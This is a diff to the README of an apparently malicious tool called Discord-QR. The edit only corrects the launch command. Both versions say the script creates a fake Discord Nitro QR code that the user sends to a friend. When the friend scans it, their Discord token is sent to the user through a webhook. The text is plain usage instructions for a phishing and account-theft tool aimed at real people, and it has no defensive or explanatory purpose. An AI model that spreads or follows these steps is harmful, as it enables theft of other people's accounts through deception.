@@ -14,7 +14,7 @@ Install requirements :
 ```
 pip3 install -r requirements.txt
 ```
-Then if steps above were succesful after launching the python file by doing ```python Discord-QR```, it will then create a fake discord nitro QR code in the same directory. Copy that image and send it to a friend. Once they scan it you get there discord token sent to you via the webhook.
+Then if steps above were succesful you can now launch the python file by doing ```python Discord-QR.py```, it will then create a fake discord nitro QR code in the same directory. Copy that image and send it to a friend. Once they scan it you get there discord token sent to you via the webhook.
 
 **Requirements:**\
 Python3, Windows(x64), Google Chrome
